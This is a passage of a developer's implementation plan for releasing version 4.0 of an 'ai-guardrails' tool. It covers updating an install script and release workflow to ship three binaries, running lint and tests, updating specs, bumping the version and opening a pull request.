Modify the section that does the download/extract/move. Pseudocode of the change:

```sh
BINARIES="ai-guardrails ai-guardrails-hk ai-guardrails-hk-cc-tools"
for BIN in $BINARIES; do
    SRC="${TMP}/${BIN}-${PLATFORM}-${ARCH}"
    DST="${INSTALL_DIR}/${BIN}"
    if [ ! -f "$SRC" ]; then
        printf 'Error: missing %s in release archive\n' "$BIN" >&2
        exit 1
    fi
    chmod +x "$SRC"
    mv -f "$SRC" "$DST"
    printf 'Installed %s -> %s\n' "$BIN" "$DST"
done
```

(Adjust the actual `SRC` path to match what the release tarball contains — see Task 7.2.)

- [ ] **Step 3: Smoke test the install script in a sandbox**

Run:
```bash
INSTALL_DIR=/tmp/ag-install-test sh scripts/install.sh --dry-run 2>&1 | head -20
```
(Add a `--dry-run` flag if not present, or run with `set -x` against a synthetic tarball.)

Expected: script reports planning to install all three binaries.

- [ ] **Step 4: Commit**

```bash
git add scripts/install.sh
git commit -m "feat(install): download all three v4 binaries

scripts/install.sh now installs ai-guardrails + ai-guardrails-hk +
ai-guardrails-hk-cc-tools into INSTALL_DIR (default ~/.local/bin)."
```

### Task 7.2: Update release workflow to build + upload all three binaries per platform

**Files:**
- Modify: `.github/workflows/release.yml`

- [ ] **Step 1: Locate the build step**

Run: `grep -n "bun run build\|outfile\|dist/" .github/workflows/release.yml`
Find the matrix entry that calls `bun run build` and the upload step.

- [ ] **Step 2: Replace `bun run build` with `bun run build:all` and update upload paths**

```diff
-      - run: bun run build
+      - run: bun run build:all
       - uses: actions/upload-release-asset@<sha>
         with:
-          asset_path: dist/ai-guardrails-${{ matrix.platform }}-${{ matrix.arch }}
+          asset_path: dist/ai-guardrails-${{ matrix.platform }}-${{ matrix.arch }}.tar.gz
```

(Wrap the three binaries in a tarball per platform. Adjust to match the project's existing release-asset shape — if it currently uploads bare binaries, switch to a tarball or upload three assets.)

- [ ] **Step 3: Run workflow locally with `act` if available, otherwise commit and rely on the next dry-run release**

Run: `act -j release --dryrun 2>&1 | tail -20` (skip if `act` not installed).

- [ ] **Step 4: Commit**

```bash
git add .github/workflows/release.yml
git commit -m "ci(release): build and upload all three v4 binaries per platform"
```

---

## Phase 8 — Cleanup, dogfood, docs

### Task 8.1: Run the full verification loop

- [ ] **Step 1: Lint**

Run: `bun run lint`
Expected: clean.

- [ ] **Step 2: Typecheck**

Run: `bun run typecheck`
Expected: clean.

- [ ] **Step 3: Full test suite**

Run: `bun test 2>&1 | tail -30`
Expected: all tests pass. If any test still references `runHookEvent`, `runHook`, `hook run`, `HOOK_COMMAND`, or `@/hooks/run`, fix or delete it.

- [ ] **Step 4: Build all binaries**

Run: `bun run build:all`
Expected: three binaries in `dist/`.

- [ ] **Step 5: Self-dogfood**

Run: `./dist/ai-guardrails check --project-dir .`
Expected: exits 0 (no new lint issues vs baseline).

- [ ] **Step 6: Commit any cleanup**

If anything needed fixing, commit it now:
```bash
git add -A
git commit -m "chore: verification-loop cleanup"
```

### Task 8.2: Update CLAUDE.md and supplemental SPEC references

**Files:**
- Modify: `CLAUDE.md` (sections referencing `hook` subcommand or hook-kit version)
- Modify: `docs/specs/SPEC-005-hooks.md` (if it documents the old wiring)
- Modify: `docs/specs/SPEC-012-hook-binary-resolution.md` (the resolution model changed)

- [ ] **Step 1: Find references**

Run: `grep -rn 'hook run\|HOOK_COMMAND\|hook-kit.*0.2\|ai-guardrails hook ' CLAUDE.md docs/specs/`
Expected: list of stale references.

- [ ] **Step 2: Update each file**

For each match:
- Replace `ai-guardrails hook run` references with `ai-guardrails-hk-cc-tools` or "the cc-tools binary".
- Replace `ai-guardrails hook suppress-comments` with `ai-guardrails check-suppress-comments`.
- Replace `ai-guardrails hook format-stage` with `ai-guardrails format-stage`.
- Update SPEC-005 to mark the cc-tools-binary wiring as the v4 default; cross-link to SPEC-014.
- Update SPEC-012 to note the resolution simplification (no more `command -v` guard).
- Bump the hook-kit version mention in CLAUDE.md if any.

- [ ] **Step 3: Commit**

```bash
git add CLAUDE.md docs/specs/SPEC-005-hooks.md docs/specs/SPEC-012-hook-binary-resolution.md
git commit -m "docs: update CLAUDE.md and SPEC-005/012 for v4 hook architecture"
```

### Task 8.3: Bump version and update CHANGELOG

**Files:**
- Modify: `package.json` (version field → `4.0.0`)
- Modify: `CHANGELOG.md` (if present)

- [ ] **Step 1: Bump major**

```diff
   "name": "@questi0nm4rk/ai-guardrails",
-  "version": "3.x.y",
+  "version": "4.0.0",
```

- [ ] **Step 2: Add CHANGELOG entry**

If `CHANGELOG.md` exists, prepend a `## v4.0.0` section listing:
- BREAKING: dropped `ai-guardrails hook` subcommand
- BREAKING: bumped `@questi0nm4rk/hook-kit` to ^0.3.0
- BREAKING: install script downloads three binaries (~150MB total)
- ADDED: `ai-guardrails-hk` shell wrapper (caller-agnostic)
- ADDED: `ai-guardrails-hk-cc-tools` Claude Code adapter
- ADDED: top-level `ai-guardrails format-stage` and `ai-guardrails check-suppress-comments`
- CHANGED: `.claude/settings.json` rewritten on `ai-guardrails generate` to point at the new binary
- CHANGED: hook timeout reduced to 60s to stay under CC's default Bash tool budget

- [ ] **Step 3: Commit**

```bash
git add package.json CHANGELOG.md
git commit -m "chore(release): v4.0.0 — hook-kit 0.3 migration"
```

### Task 8.4: Open the PR

- [ ] **Step 1: Push branch**

Run: `git push -u origin feat/hook-kit-0.3-migration`

- [ ] **Step 2: Open PR**

Run:
```bash
gh pr create --title "feat: v4.0 — hook-kit 0.3 migration (SPEC-014)" --body "$(cat <<'EOF'
## Summary
- Adopts hook-kit 0.3 fully — three binaries (`ai-guardrails`, `ai-guardrails-hk`, `ai-guardrails-hk-cc-tools`)
- Removes `ai-guardrails hook` subcommand (BREAKING)
- Promotes `format-stage` to top-level; suppress-comments becomes a content() rule + a `check-suppress-comments` lefthook helper
- Hook timeout: 60s (under CC default Bash budget)

Spec: `docs/specs/SPEC-014-hook-kit-0.3-migration.md`
Plan: `docs/plans/hook-kit-0.3-migration/plan.md`

## Test plan
- [ ] `bun run lint`
- [ ] `bun run typecheck`
- [ ] `bun test` (incl. binary smoke tests in tests/binaries/)
- [ ] `bun run build:all` produces three binaries
- [ ] `./dist/ai-guardrails check --project-dir .` self-dogfood passes
- [ ] cc-review approves
EOF
)"
```

- [ ] **Step 3: Wait for cc-review**

Run: `gh pr view --json number,reviews | jq` after cc-review fires. Address every comment.

---

## Self-review checklist (run after writing this plan)

**Spec coverage:**
- [x] Three binaries (`ai-guardrails`, `ai-guardrails-hk`, `ai-guardrails-hk-cc-tools`) — Task 6.1
- [x] `src/hooks.ts` module entrypoint — Task 3.3
- [x] Runtime TOML config load — Task 3.3 (uses existing `loadHookConfig`)
- [x] Hook subcommand removal — Task 4.4
- [x] `format-stage` promotion — Task 4.1, 4.3
- [x] `allow-comment` "promotion" → noted as no-op, spec corrected — Task 4.2
- [x] `suppress-comments` → content() rule + `check-suppress-comments` lefthook helper — Task 2.1, Task 5.2
- [x] `claude-settings.ts` rewire — Task 5.1
- [x] `lefthook.ts` rewire — Task 5.2
- [x] Install script update — Task 7.1
- [x] Release workflow update — Task 7.2
- [x] `--hook-timeout 60` — Task 6.1
- [x] `isDangerous` BDD helper relocation — Task 3.1, 3.2

**Type consistency:**
- `suppressCommentsRule()` (singular, no args) used in Task 2.1 + Task 3.3 — consistent.
- `BINARY_NAME = "ai-guardrails-hk-cc-tools"` in Task 5.1 matches the build script in Task 6.1 — consistent.
- `HOOK_TIMEOUT_SECONDS = 60` in Task 5.1 matches `--hook-timeout 60` in Task 6.1 — consistent.

**No placeholders:** every code-touching step has the actual code.
